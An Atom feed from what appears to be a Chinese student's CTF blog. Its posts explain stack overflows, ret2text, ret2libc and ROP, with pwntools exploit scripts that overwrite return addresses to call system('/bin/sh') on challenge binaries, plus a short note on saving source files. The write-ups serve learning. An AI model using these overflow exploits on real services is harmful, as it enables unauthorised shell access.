<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>JiuTian&#39;s blog</title>
  
  <subtitle>曼彻斯特的天空是蓝色的</subtitle>
  <link href="https://jiutian521.github.io/atom.xml" rel="self"/>
  
  <link href="https://jiutian521.github.io/"/>
  <updated>2025-11-05T13:40:51.538Z</updated>
  <id>https://jiutian521.github.io/</id>
  
  <author>
    <name>JiuTian521</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>用gdb的动态视角看ret2text的实现</title>
    <link href="https://jiutian521.github.io/posts/2ee84d32.html"/>
    <id>https://jiutian521.github.io/posts/2ee84d32.html</id>
    <published>2025-11-05T13:21:00.000Z</published>
    <updated>2025-11-05T13:40:51.538Z</updated>
    
    <content type="html"><![CDATA[<p>来看一道非常简单的栈溢出</p><p><img src="https://youke1.picui.cn/s1/2025/11/05/690b4fae7ce4b.png" alt="Snipaste_2025-11-05_21-22-13.png"></p><p>后门函数地址ida里很明显，0x8048521</p><p>exp本身不难写,下面看一下怎么用gdb确定偏移</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">io=process(&quot;./pwn&quot;)</span><br><span class="line">#io=remote(&quot;pwn.challenge.ctf.show&quot;,28175);</span><br><span class="line">gdb.attach(io,&quot;b main&quot;) #在main函数下断点</span><br><span class="line">payload=b&quot;A&quot;*(0x12+0x4)+p32(0x8048521)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://youke1.picui.cn/s1/2025/11/05/690b52df75180.png" alt="Snipaste_2025-11-05_21-36-52.png"></p><p><img src="https://youke1.picui.cn/s1/2025/11/05/690b533859667.png" alt="Snipaste_2025-11-05_21-37-43.png"></p><p>0xffffcfd8 是当前函数的栈底，指向的0xffffcfe8是上一个函数的栈底（old_ebp）</p><p>用0xffffcfd8减去0xffffcfc6得到0x12，这也就对上了ida里的偏移量</p><p>我们退出，输入fini直接运行完，可以看出已经覆盖了0x12+0x4个字节，并且我们的后门函数地址已经成功覆盖到了ebp下的返回地址</p><p><img src="https://youke1.picui.cn/s1/2025/11/05/690b53386ffa9.png" alt="Snipaste_2025-11-05_21-37-58.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;来看一道非常简单的栈溢出&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://youke1.picui.cn/s1/2025/11/05/690b4fae7ce4b.png&quot; alt=&quot;Snipaste_2025-11-05_21-22-13.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;后门函</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>写源代码一定要crtl+s保存啊啊啊啊啊</title>
    <link href="https://jiutian521.github.io/posts/d4f00467.html"/>
    <id>https://jiutian521.github.io/posts/d4f00467.html</id>
    <published>2025-11-05T04:00:00.000Z</published>
    <updated>2025-11-05T13:21:26.476Z</updated>
    
    <content type="html"><![CDATA[<p>今天想在css里加点东西，但是每次都是原来的样子，搞了一晚上都不行，一直是原来的样子，发现是自己改完后没有保存</p><p>看一下左下角的时间，如果是now那就证明保存了</p><p>另外，如果hexo d上传失败，可以按f12在网页里改一下，重新hexo d一下就可以了，实在不行，多等一小儿就可以了</p><p>最后，感谢我磊哥再一次救我</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;今天想在css里加点东西，但是每次都是原来的样子，搞了一晚上都不行，一直是原来的样子，发现是自己改完后没有保存&lt;/p&gt;
&lt;p&gt;看一下左下角的时间，如果是now那就证明保存了&lt;/p&gt;
&lt;p&gt;另外，如果hexo d上传失败，可以按f12在网页里改一下，重新hexo d一下就可以</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>梦开始的地方</title>
    <link href="https://jiutian521.github.io/posts/1234.html"/>
    <id>https://jiutian521.github.io/posts/1234.html</id>
    <published>2025-11-02T10:00:00.000Z</published>
    <updated>2025-11-02T09:57:23.131Z</updated>
    
    <content type="html"><![CDATA[<p>我的博客搭建终于好了！</p><p>从今天起，我会在我的博客上分享我的<strong>wp</strong>，以及一些<strong>CTF的日常</strong>，希望和大家一起多多交流！</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;我的博客搭建终于好了！&lt;/p&gt;
&lt;p&gt;从今天起，我会在我的博客上分享我的&lt;strong&gt;wp&lt;/strong&gt;，以及一些&lt;strong&gt;CTF的日常&lt;/strong&gt;，希望和大家一起多多交流！&lt;/p&gt;
</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>初识ret2libc</title>
    <link href="https://jiutian521.github.io/posts/b342ee9.html"/>
    <id>https://jiutian521.github.io/posts/b342ee9.html</id>
    <published>2025-11-01T04:30:00.000Z</published>
    <updated>2025-11-05T14:02:46.124Z</updated>
    
    <content type="html"><![CDATA[<p>从ret2libc开始，我们将不再局限于像ret2text那样的栈溢出了，而是要开始接触另一个技术————ROP技术。什么是ROP技术我此前详细写了博客，在此不再赘述。</p><p>ret2libc就是拿程序里已有的函数库做文章，可以ret到的plt表，或或者ret到函数实际放置的got表处</p><p>egctfshow pwn入门39&amp;41<br>这两个题思路是一样的，区别是39有bin&#x2F;sh，41有sh</p><p>首先这个题是存在明显栈溢出的，而system和sh是有但是不在一起的</p><p><img src="https://youke1.picui.cn/s1/2025/11/05/690b583a12117.png" alt="Snipaste_2025-11-05_21-59-53.png"></p><p><img src="https://youke1.picui.cn/s1/2025/11/05/690b58632beb8.png" alt="Snipaste_2025-11-05_22-00-37.png"></p><p>这段payload首先填充了buf，然后把system地址改到了返回地址，然后把system的ret用四个字节填充了。为什么要填充4个字节呢，我们知道，32位系统传参是用栈传递的，我们用call调用函数时，call会把函数的返回地址压入栈中，函数调用结束后会执行ret指令，回到返回地址处。但我们并不希望system函数返回到某处，因此将返回地址填充上所谓的“虚假地址”，而返回地址往后是system函数的一参，也是我们希望sh在的地方。因此接下来把sh写到system函数的一参，就可以执行shll了</p><p><img src="https://youke1.picui.cn/s1/2025/11/05/690b5886da79b.png" alt="Snipaste_2025-11-05_22-01-12.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;从ret2libc开始，我们将不再局限于像ret2text那样的栈溢出了，而是要开始接触另一个技术————ROP技术。什么是ROP技术我此前详细写了博客，在此不再赘述。&lt;/p&gt;
&lt;p&gt;ret2libc就是拿程序里已有的函数库做文章，可以ret到的plt表，或或者ret到函数</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>初识ROP</title>
    <link href="https://jiutian521.github.io/posts/2b89d936.html"/>
    <id>https://jiutian521.github.io/posts/2b89d936.html</id>
    <published>2025-11-01T04:00:00.000Z</published>
    <updated>2025-11-05T14:02:31.668Z</updated>
    
    <content type="html"><![CDATA[<p>如果遇到NX保护，即栈堆不可执行的情况，我们shellcode将不能作为机器码被执行，那么我们就需要新的方法————ROP技术。</p><p>何为ROP？ROP的全称为返回导向编程。听名字十分牛的样子。ROP的核心在返回，即ret上。ret等价于pop EIP&#x2F;RIP，call所调用的函数结束后，ret会把返回地址弹出栈，程序会跳到ret指向的地址。</p><p><img src="https://youke1.picui.cn/s1/2025/11/05/690b5571a395c.png" alt="Snipaste_2025-11-05_21-47-57.png"></p><p>出自《深入理解计算机系统（CSAPP）》第三章,要注意的一个问题是，国内外的计算机教材对于栈的画法是相反的，国外的教材更倾向于把栈倒过来画，即栈顶sp在下，栈底bp在上，栈向下增长（向下画）。不过并不影响实际的理解。</p><p>接下来我们需要知道什么是gadget。gadget在英语里的翻译是小玩意，小装置的意思，在二进制领域，gadget就是一小段程序里已经有的，通常以ret结尾的汇编代码，注意这里的关键词，“一小段”，“已有的”，“以ret结尾的”，重点是后两个词，这就意味着我们可以通过一段又一段的gadget不断ret到程序内的不同地方。就算开了NX不让我们执行shellcode，但是程序里已经有的指令总不能不让我们执行吧，这就是gadget的用处。</p><p>所以ROP就是一项通过构造一系列的gadget实现攻击的技术。</p><p>再讲一下got表和plt表是什么，这一块牵扯到静态链接和动态链接，以及延迟绑定相关的内容。延迟绑定我还没有做到涉及的题目，所以暂时按下不表。</p><p>静态链接就是把程序要用的函数，代码等直接写进了可执行文件里，在编译时加载，缺点就是文件的大小会比较大。动态链接会在程序启动时从动态链接库里调用函数，比如libc库。</p><p>PLT表（Procedure Linkage Table，过程链接表），用于支持动态链接函数调用（例如 printf, puts, system等），相当于调用外部函数时的跳板。GOT表 （Global Offset Table全局偏移表）是在运行时保存动态库函数或全局变量实际地址的表。plt表经过一段复杂的过程后，会跳转并链接到got表，这里是存储函数的真实地址，动态链接器负责把libc的地址写进got表，got表会跳转到存放函数的真实地址。</p><p>接下来我以CTFshow的pwn入门43题讲解一下ROP的使用</p><p><img src="https://youke1.picui.cn/s1/2025/11/05/690b55c3c7f30.png" alt="Snipaste_2025-11-05_21-49-22.png"></p><p>这种情况下我们需要想办法自己构造出一个bin&#x2F;sh出来，我们首先需要知道程序的哪个地方存在可读可写的段。我们gdb程序，在main函数下断点并运行，使用vmmap指令</p><p><img src="https://youke1.picui.cn/s1/2025/11/05/690b560fedca7.png" alt="Snipaste_2025-11-05_21-50-32.png"></p><p>果然.bss段里有一个buf2的变量，我们可以把bin&#x2F;sh写进去</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br><span class="line"></span><br><span class="line">#io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28119)</span><br><span class="line">io = process(&quot;./pwn43&quot;)</span><br><span class="line">gdb.attach(io,&#x27;&#x27;&#x27;break *0x08048420</span><br><span class="line">           break *0x08048450&#x27;&#x27;&#x27;)</span><br><span class="line"></span><br><span class="line">buf2 = 0x0804B060</span><br><span class="line">system = 0x08048450</span><br><span class="line">gets = 0x08048420</span><br><span class="line">payload= b&#x27;A&#x27;*(0x6c+0x4)</span><br><span class="line">payload += p32(gets)</span><br><span class="line">payload += p32(system)</span><br><span class="line">payload += p32(buf2)</span><br><span class="line">payload += p32(buf2)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(b&quot;/bin/sh&quot;)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>来解释一下这段exp：第一步栈溢出，覆盖到EIP处，把EIP指向的返回地址改到gets处，再将gets的返回地址改为system，在调用完gets函数后，会弹出ret指令，ret到system的位置，第一个buf2作为gets的参数，我们的目的是通过gets将bin&#x2F;sh字符写入buf2，（io.sendline(b”&#x2F;bin&#x2F;sh”)就是把bin&#x2F;sh字符串通过gets函数读入buf里），而第二个buf2作为system的一参被调用，最后成功执行system bin&#x2F;sh获得shell</p><p>我们用gdb调试一下，验证这段exp是否正确。</p><p>我们在exp里，在gets函数和system函数处分别下一个断点，运行exp进入gdb调试界面，按c走到第一个断点之前</p><p><img src="https://youke1.picui.cn/s1/2025/11/05/690b5668a58ff.png" alt="Snipaste_2025-11-05_21-52-00.png"></p><p>这里的backtrace窗口简称bt窗口，可以显示当前程序的调用栈，即call stack，每一行都是一个栈帧，可以帮我们看函数调用的顺序</p><p>我们可以看的非常清楚，我们的ebp已经被aaaa覆盖，eip被改到了gets函数处，esp栈顶被改到了system处，在栈窗口，system下方是我们覆盖的两个buf2</p><p><img src="https://youke1.picui.cn/s1/2025/11/05/690b56db7d3d8.png" alt="Snipaste_2025-11-05_21-53-44.png"></p><p>我们继续按c，执行完gets函数，到system断点前，x&#x2F;s查看一下buf的内存，可以看到bin&#x2F;sh已经被成功写到buf2里了</p><p><img src="https://youke1.picui.cn/s1/2025/11/05/690b572e8e9ad.png" alt="Snipaste_2025-11-05_21-55-25.png"></p><p>总结一下，本题属于典型的有system无bin&#x2F;sh或sh代替，需要我们自己在一段可读可写的内存里写入bin&#x2F;sh字符串，是非常经典的一道基本ret2libc题目，让我们初步认识了ROP的原理以及是如何构造的，如何找到可读可写的内存，plt表和got表是什么，动态链接和静态链接的过程分别是怎么样的，32位系统是如何通过栈传参的，栈是如何增长的，call和ret指令的本质是怎样的等</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;如果遇到NX保护，即栈堆不可执行的情况，我们shellcode将不能作为机器码被执行，那么我们就需要新的方法————ROP技术。&lt;/p&gt;
&lt;p&gt;何为ROP？ROP的全称为返回导向编程。听名字十分牛的样子。ROP的核心在返回，即ret上。ret等价于pop EIP&amp;#x2F;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>ret2text小tips</title>
    <link href="https://jiutian521.github.io/posts/1111.html"/>
    <id>https://jiutian521.github.io/posts/1111.html</id>
    <published>2025-10-24T04:00:00.000Z</published>
    <updated>2025-11-05T13:46:20.888Z</updated>
    
    <content type="html"><![CDATA[<p>exp模板</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">io = remote(&quot;39.106.48.123&quot;, 29826)</span><br><span class="line"></span><br><span class="line">payload = b&quot;A&quot;*264 + p64(0x401202)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>264即258+8，258是rbp的位置，ida里一般是16位，0x401202为后门函数入栈的地址</p><p>注意：1.一定不要忘记加4&#x2F;8个字节覆盖栈底寄存器 2.在64位程序中，如果不成功，可能是栈没有对齐，需要把后门函数的地址往后加两个单位</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;exp模板&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/spa</summary>
      
    
    
    
    
  </entry>
  
</feed>
